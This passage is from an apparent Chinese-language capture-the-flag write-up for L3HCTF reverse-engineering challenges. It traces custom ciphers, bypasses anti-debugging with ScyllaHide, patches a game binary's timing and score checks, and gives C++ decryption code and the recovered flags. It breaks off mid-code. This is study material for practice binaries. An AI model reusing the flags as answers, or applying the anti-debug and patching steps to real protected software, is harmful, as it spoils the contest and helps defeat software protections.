class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">stack_data[0] = co_consts[0];</span><br><span class="line">stack_data[1] = co_consts[1];</span><br><span class="line">stack_data[2] = co_consts[0];</span><br><span class="line">stack_data[1] = stack_data[1]^stack_data[2];</span><br><span class="line">stack_data[2] = co_consts[16];</span><br><span class="line">stack_data[1] = stack_data[2]-stack_data[1];</span><br><span class="line">stack_data[2] = co_consts[2];</span><br><span class="line">stack_data[3] = co_consts[1];</span><br><span class="line">stack_data[2] = stack_data[2]^stack_data[3];</span><br><span class="line">stack_data[3] = co_consts[17];</span><br><span class="line">stack_data[2] = stack_data[3]-stack_data[2];</span><br><span class="line">stack_data[3] = co_consts[3];</span><br><span class="line">stack_data[4] = co_consts[2];</span><br><span class="line">stack_data[3] = stack_data[3]^stack_data[4];</span><br><span class="line">stack_data[4] = co_consts[18];</span><br><span class="line">stack_data[3] = stack_data[3]+stack_data[4];</span><br><span class="line">stack_data[4] = co_consts[4];</span><br><span class="line">stack_data[5] = co_consts[3];</span><br><span class="line">stack_data[4] = stack_data[4]^stack_data[5];</span><br><span class="line">stack_data[5] = co_consts[19];</span><br><span class="line">stack_data[4] = stack_data[4]+stack_data[5];</span><br><span class="line">stack_data[5] = co_consts[5];</span><br><span class="line">stack_data[6] = co_consts[4];</span><br><span class="line">stack_data[5] = stack_data[5]^stack_data[6];</span><br><span class="line">stack_data[6] = co_consts[20];</span><br><span class="line">stack_data[5] = stack_data[6]-stack_data[5];</span><br><span class="line">stack_data[6] = co_consts[6];</span><br><span class="line">stack_data[7] = co_consts[5];</span><br><span class="line">stack_data[6] = stack_data[6]^stack_data[7];</span><br><span class="line">stack_data[7] = co_consts[21];</span><br><span class="line">stack_data[6] = stack_data[6]+stack_data[7];</span><br><span class="line">stack_data[7] = co_consts[7];</span><br><span class="line">stack_data[8] = co_consts[6];</span><br><span class="line">stack_data[7] = stack_data[7]^stack_data[8];</span><br><span class="line">stack_data[8] = co_consts[22];</span><br><span class="line">stack_data[7] = stack_data[7]+stack_data[8];</span><br><span class="line">stack_data[8] = co_consts[8];</span><br><span class="line">stack_data[9] = co_consts[7];</span><br><span class="line">stack_data[8] = stack_data[8]^stack_data[9];</span><br><span class="line">stack_data[9] = co_consts[23];</span><br><span class="line">stack_data[8] = stack_data[8]+stack_data[9];</span><br><span class="line">stack_data[9] = co_consts[9];</span><br><span class="line">stack_data[10] = co_consts[8];</span><br><span class="line">stack_data[9] = stack_data[9]^stack_data[10];</span><br><span class="line">stack_data[10] = co_consts[24];</span><br><span class="line">stack_data[9] = stack_data[9]+stack_data[10];</span><br><span class="line">stack_data[10] = co_consts[10];</span><br><span class="line">stack_data[11] = co_consts[9];</span><br><span class="line">stack_data[10] = stack_data[10]^stack_data[11];</span><br><span class="line">stack_data[11] = co_consts[25];</span><br><span class="line">stack_data[10] = stack_data[10]+stack_data[11];</span><br><span class="line">stack_data[11] = co_consts[11];</span><br><span class="line">stack_data[12] = co_consts[10];</span><br><span class="line">stack_data[11] = stack_data[11]^stack_data[12];</span><br><span class="line">stack_data[12] = co_consts[26];</span><br><span class="line">stack_data[11] = stack_data[11]+stack_data[12];</span><br><span class="line">stack_data[12] = co_consts[12];</span><br><span class="line">stack_data[13] = co_consts[11];</span><br><span class="line">stack_data[12] = stack_data[12]^stack_data[13];</span><br><span class="line">stack_data[13] = co_consts[27];</span><br><span class="line">stack_data[12] = stack_data[13]-stack_data[12];</span><br><span class="line">stack_data[13] = co_consts[13];</span><br><span class="line">stack_data[14] = co_consts[12];</span><br><span class="line">stack_data[13] = stack_data[13]^stack_data[14];</span><br><span class="line">stack_data[14] = co_consts[28];</span><br><span class="line">stack_data[13] = stack_data[14]-stack_data[13];</span><br><span class="line">stack_data[14] = co_consts[14];</span><br><span class="line">stack_data[15] = co_consts[13];</span><br><span class="line">stack_data[14] = stack_data[14]^stack_data[15];</span><br><span class="line">stack_data[15] = co_consts[29];</span><br><span class="line">stack_data[14] = stack_data[14]+stack_data[15];</span><br><span class="line">stack_data[15] = co_consts[15];</span><br><span class="line">stack_data[16] = co_consts[14];</span><br><span class="line">stack_data[15] = stack_data[15]^stack_data[16];</span><br><span class="line">stack_data[16] = co_consts[30];</span><br><span class="line">stack_data[15] = stack_data[16]-stack_data[15];</span><br><span class="line">Compare...</span><br></pre></td></tr></table></figure><p>通过研究上面流程输出，可以发现co_consts里面存在的那十五个整数是作为一个key的作用，然后分为两种加密。</p><ol><li>密文&#x3D;密钥[i-1]-(明文[i]^明文[i-1])</li><li>密文&#x3D;(明文[i]^明文[i-1])+密钥[i-1]</li></ol><p><strong>1,2,5,12,13,15</strong>下标是第一种，其余是第二种加密。</p><h3 id="解密代码-1"><a href="#解密代码-1" class="headerlink" title="解密代码"></a>解密代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> cipher[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x000000F3</span>, <span class="number">0x00000082</span>, <span class="number">0x00000006</span>, <span class="number">0x000001FD</span>, <span class="number">0x00000150</span>, <span class="number">0x00000038</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000DE</span>,</span><br><span class="line">    <span class="number">0x0000015A</span>, <span class="number">0x00000197</span>, <span class="number">0x0000009C</span>, <span class="number">0x000001D7</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000028</span>, <span class="number">0x00000146</span>, <span class="number">0x00000097</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x000000B0</span>, <span class="number">0x000000C8</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000086</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000BF</span>,</span><br><span class="line">    <span class="number">0x000000C9</span>, <span class="number">0x00000064</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000EF</span>, <span class="number">0x00000087</span>, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 比较处比较的是密文和cipher-20，所以该处全部-20为目标密文。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher[i] -= <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span>* Cipher = cipher;</span><br><span class="line">    <span class="type">uint32_t</span> m[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    m[<span class="number">0</span>] = Cipher[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> SubIndexList[]&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">15</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> IsSub = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == SubIndexList[j])</span><br><span class="line">                IsSub = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (IsSub)</span><br><span class="line">        &#123;</span><br><span class="line">            m[i] = key[i - <span class="number">1</span>] - cipher[i];</span><br><span class="line">            m[i] ^= m[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            m[i] = cipher[i] - key[i - <span class="number">1</span>];</span><br><span class="line">            m[i] ^= m[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, m[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// df9d4ba41258574ccb7155b9d01f5c58</span></span><br></pre></td></tr></table></figure><p>L3HCTF{df9d4ba41258574ccb7155b9d01f5c58}</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>IDA调试发现存在反调试直接退出，直接断点runtime_main_func1开头，用ScyllaHide就可以过反调试。</p><p>发现运行后过一会报time error错误退出，可能是存在其他反调试，这边直接断点runtime_exit，然后运行游戏马上按ESC手动退出，通过栈回溯就可以找到调用方。</p><p><img src="/2025/07/14/L3HCTF/image-14.png" alt="alt text"></p><p>发现是这个函数这边调用的，那么就重点调试这边上面部分的代码。调试发现sub_50D220执行游戏就开始，那么游戏核心函数就在这里面。</p><p><img src="/2025/07/14/L3HCTF/image-15.png" alt="alt text"></p><p>之后会遇到很多函数无法反编译，解决方法是直接delete函数，跳过开头这两行汇编，对下面的剩余代码按P还原成函数即可。</p><p><img src="/2025/07/14/L3HCTF/image-16.png" alt="alt text"></p><p>动调sub_50D220内部，最后发现sub_509EA0这边调用了游戏Call，步入进去，走到call rcx再步入，就可以跳到游戏部分，sub_50BAC0。</p><p><img src="/2025/07/14/L3HCTF/image-17.png" alt="alt text"></p><p>在游戏Call开头会发现一个时间检测，检测时间差是否大于80ms，直接在v4判断处断点赋值rcx为0，就可以跳过if里面的代码，也就绕过了时间检测。</p><p><img src="/2025/07/14/L3HCTF/image-18.png" alt="alt text"></p><p> <img src="/2025/07/14/L3HCTF/image-19.png" alt="alt text"></p><p>可以看到该函数里面有一些类RC4的代码。</p><p> <img src="/2025/07/14/L3HCTF/image-20.png" alt="alt text"></p><p>通过动调、patch，发现该处是加分的地方，只要满足外面两个if进来就是score+1，然后下面进行一次类RC4的加解密。</p><p><img src="/2025/07/14/L3HCTF/image-22.png" alt="alt text"></p><p>直接将这两处的判断都去掉，就可以让他进入加分代码。</p><p><img src="/2025/07/14/L3HCTF/image-24.png" alt="alt text"></p><p>在此处断点，随便修改个分数，0xAA，然后运行代码。</p><p><img src="/2025/07/14/L3HCTF/image-25.png" alt="alt text"></p><p>发现游戏Call调用方函数下面这个函数被调用了。</p><p><img src="/2025/07/14/L3HCTF/image-26.png" alt="alt text"></p><p>步入函数，发现这边判断了分数是否&gt;&#x3D;100，然后执行里面的一些相关操作，会输出一些数据，但是发现执行后并没有输出什么在控制台。</p><p>猜测可能是要手动一次一次执行加分代码到100，因为加分代码里面存在类RC4加解密代码，可能是需要执行100次才能让这边成功输出数据。</p><p><img src="/2025/07/14/L3HCTF/image-27.png" alt="alt text"></p><p>这边采用patch加分条件代码来让程序跑的时候一直自动加分，还需要patch时间检测相关代码，不然程序正常运行的时候跑一半就会报time error错误。</p><p>一下截图为需要nop的两处地方。</p><p><img src="/2025/07/14/L3HCTF/image-24.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-28.png" alt="alt text"></p><p>保存patch到程序，运行让他跑到100，控制台就会自动输出Flag。</p><p><img src="/2025/07/14/L3HCTF/image-29.png" alt="alt text"></p><p>L3HCTF{ad4d5916-9697-4219-af06-014959c2f4c9}</p><h2 id="ez-android"><a href="#ez-android" class="headerlink" title="ez_android"></a>ez_android</h2><p>java层太多东西找不到核心，直接看lib，在greet函数可以找到加密代码以及密文比较，直接编写解密即可。</p><p><img src="/2025/07/14/L3HCTF/image-30.png" alt="alt text"></p><h3 id="解密代码-2"><a href="#解密代码-2" class="headerlink" title="解密代码"></a>解密代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v10&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v10 = i - <span class="number">14</span>;</span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">14</span>)</span><br><span class="line">v10 = i;</span><br><span class="line">Input[i] ^= Key[(i + <span class="number">4</span>) % <span class="number">14</span>];</span><br><span class="line">Input[i] = ((Input[i] &gt;&gt; (Key[(i + <span class="number">3</span>) % <span class="number">0xEu</span>] &amp; <span class="number">7</span>)) | (Input[i] &lt;&lt; (-Key[(i + <span class="number">3</span>) % <span class="number">0xEu</span>] &amp; <span class="number">7</span>)));</span><br><span class="line">Input[i] = (Input[i] - Key[(<span class="type">uint8_t</span>)(((<span class="number">2</span> * i) | <span class="number">1</span>) - <span class="number">14</span> * ((<span class="number">147</span> * ((<span class="type">uint8_t</span>)(<span class="number">2</span> * i) | <span class="number">1u</span>)) &gt;&gt; <span class="number">11</span>))]) ^ Key[v10];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key[] = <span class="string">&quot;dGhpc2lzYWtleQ&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> Cipher[] = &#123; <span class="number">0x0C</span>,<span class="number">0x15</span>,<span class="number">0x25</span>,<span class="number">0xA0</span>,<span class="number">0x63</span>,<span class="number">0x96</span>,<span class="number">0x40</span>,<span class="number">0x0A</span>,<span class="number">0x5C</span>,<span class="number">0x16</span>,<span class="number">0x65</span>,<span class="number">0x40</span>,<span class="number">0x29</span>,<span class="number">0x06</span>,<span class="number">0xE1</span>,<span class="number">0x1F</span>,<span class="number">0x90</span>,<span class="number">0x72</span>,<span class="number">0x2C</span>,<span class="number">0x0E</span>,<span class="number">0x4C</span>,<span class="number">0x0A</span>,<span class="number">0x02</span>,<span class="number">0xFC</span>,<span class="number">0x4f</span>,<span class="number">0x32</span>,<span class="number">0x2A</span>&#125;;</span><br><span class="line"><span class="built_in">Decrypt</span>(Cipher, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.27s\n&quot;</span>, Cipher);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// L3HCTF&#123;ez_rust_reverse_lol&#125;</span></span><br></pre></td></tr></table></figure><p>L3HCTF{ez_rust_reverse_lol}</p><h2 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h2><p>主函数可以看到先调用了VM，然后再调用了一个密文比较，密文这边就可以取到，共32字节。</p><p><img src="/2025/07/14/L3HCTF/image-31.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-32.png" alt="alt text"></p><p>这里就是核心VM代码。</p><p><img src="/2025/07/14/L3HCTF/image-33.png" alt="alt text"></p><p>可以看到VM里面存在共8种运算，我的做法是只关注运算。直接右键同步到汇编界面，对8个运算的汇编都断点，写条件代码，将运算的两个值以及结果都输出出来。</p><p><img src="/2025/07/14/L3HCTF/image-47.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-48.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-49.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-37.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-38.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-39.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-40.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-41.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-42.png" alt="alt text"></p><p>以加法为例子，汇编界面这边两个加数是从rbp里面取的，然后计算结果存在eax里面，所以就设置断点在add下一行，然后写如下代码，获取两个加数以及计算结果，按”%X &#x3D; %X + %X;”格式化输出，其余7个运算同样这样做就可以。</p><p><img src="/2025/07/14/L3HCTF/image-44.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-43.png" alt="alt text"></p><p>运行程序输入”11112222333344445555666677778888”，方便观察加密过程。可以得到约5000行输出，但是我们只需要观察其中十几二十行就可以。</p><p><img src="/2025/07/14/L3HCTF/image-45.png" alt="alt text"></p><p>这是第一轮运算，我已经注释上了对应的代码，可以通过运算清楚看出是一个魔改TEA代码，而且Key就在运算中可以得到。</p><p><strong>Key：{ 0x0, 0xA56BABCD, 0xFFFFFFFF, 0xABCDEF01 }</strong></p><p><strong>Delta：0x11223344</strong></p><p><strong>轮数：64</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// Key&#123; 0x0, 0xA56BABCD, 0xFFFFFFFF, 0xABCDEF01 &#125;</span><br><span class="line">// Delta 0x11223344</span><br><span class="line">// RoundsNum 0x40</span><br><span class="line">// B -= (((A &lt;&lt; 2) + key[2]) ^ (A + Sum + key[3]) ^ ((A &gt;&gt; 5) + key[1]));</span><br><span class="line">91919190 = 32323232 &lt;&lt; 3;</span><br><span class="line">36FD3D5D = 91919190 + A56BABCD;</span><br><span class="line">32323232 = 32323232 + 0;</span><br><span class="line">32323232 = 32323232 + 0;</span><br><span class="line">4CF0F6F = 32323232 ^ 36FD3D5D;</span><br><span class="line">3232323 = 32323232 &gt;&gt; 4;</span><br><span class="line">3232322 = 3232323 + FFFFFFFF;</span><br><span class="line">7EC2C4D = 4CF0F6F ^ 3232322;</span><br><span class="line">391D5D7E = 7EC2C4D + 31313131;</span><br><span class="line"></span><br><span class="line">// Sum += Delta;</span><br><span class="line">11223344 = 0 + 11223344;</span><br><span class="line"></span><br><span class="line">// A -= (((B &lt;&lt; 3) + key[1]) ^ (B + Sum + key[0]) ^ ((B &gt;&gt; 4) + key[2]));</span><br><span class="line">E47575F8 = 391D5D7E &lt;&lt; 2;</span><br><span class="line">E47575F7 = E47575F8 + FFFFFFFF;</span><br><span class="line">4A3F90C2 = 391D5D7E + 11223344;</span><br><span class="line">F60D7FC3 = 4A3F90C2 + ABCDEF01;</span><br><span class="line">12780A34 = F60D7FC3 ^ E47575F7;</span><br><span class="line">1C8EAEB = 391D5D7E &gt;&gt; 5;</span><br><span class="line">A73496B8 = 1C8EAEB + A56BABCD;</span><br><span class="line">B54C9C8C = 12780A34 ^ A73496B8;</span><br><span class="line">E77ECEBE = B54C9C8C + 32323232;</span><br><span class="line"></span><br><span class="line">// Rounds--;</span><br><span class="line">3F = 40 - 1;</span><br></pre></td></tr></table></figure><p>还原加密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x0</span>, <span class="number">0xA56BABCD</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xABCDEF01</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> Delta = <span class="number">0x11223344</span>;</span><br><span class="line"></span><br><span class="line">DWORD Sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">DWORD A = Input[<span class="number">0</span>];</span><br><span class="line">DWORD B = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    A += (((B &lt;&lt; <span class="number">3</span>) + key[<span class="number">1</span>]) ^ (B + Sum + key[<span class="number">0</span>]) ^ ((B &gt;&gt; <span class="number">4</span>) + key[<span class="number">2</span>]));</span><br><span class="line">    </span><br><span class="line">    Sum += Delta;</span><br><span class="line"></span><br><span class="line">    B += (((A &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>]) ^ (A + Sum + key[<span class="number">3</span>]) ^ ((A &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Input[<span class="number">0</span>] = A;</span><br><span class="line">Input[<span class="number">1</span>] = B;</span><br></pre></td></tr></table></figure><p>需要注意一点，观察输出数据可以发现不同组加密之间共用一个Sum值，也就是第一组数据加密后的Sum值会作为下一组数据加密的初始Sum值，所以解密的时候要注意Sum值。</p><h3 id="解密代码-3"><a href="#解密代码-3" class="headerlink" title="解密代码"></a>解密代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">uint32_t</span>* Input, <span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x0</span>, <span class="number">0xA56BABCD</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xABCDEF01</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> Delta = <span class="number">0x11223344</span>;</span><br><span class="line"></span><br><span class="line">DWORD Sum = Delta * <span class="number">0x40</span> * i;</span><br><span class="line"></span><br><span class="line">DWORD A = Input[<span class="number">0</span>];</span><br><span class="line">DWORD B = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">B -= (((A &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>]) ^ (A + Sum + key[<span class="number">3</span>]) ^ ((A &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">Sum -= Delta;</span><br><span class="line"></span><br><span class="line">A -= (((B &lt;&lt; <span class="number">3</span>) + key[<span class="number">1</span>]) ^ (B + Sum + key[<span class="number">0</span>]) ^ ((B &gt;&gt; <span class="number">4</span>) + key[<span class="number">2</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Input[<span class="number">0</span>] = A;</span><br><span class="line">Input[<span class="number">1</span>] = B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD v8[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">v8[<span class="number">0</span>] = <span class="number">0x877A62A6</span>;</span><br><span class="line">v8[<span class="number">1</span>] = <span class="number">0x6A55F1F3</span>;</span><br><span class="line">v8[<span class="number">2</span>] = <span class="number">0xAE194847</span>;</span><br><span class="line">v8[<span class="number">3</span>] = <span class="number">0xB1E643E7</span>;</span><br><span class="line">v8[<span class="number">4</span>] = <span class="number">0xA94FE881</span>;</span><br><span class="line">v8[<span class="number">5</span>] = <span class="number">0x9BC8A28A</span>;</span><br><span class="line">v8[<span class="number">6</span>] = <span class="number">0xC4CFAA9F</span>;</span><br><span class="line">v8[<span class="number">7</span>] = <span class="number">0xF1A00CA1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Decrypt</span>((<span class="type">uint32_t</span>*)((<span 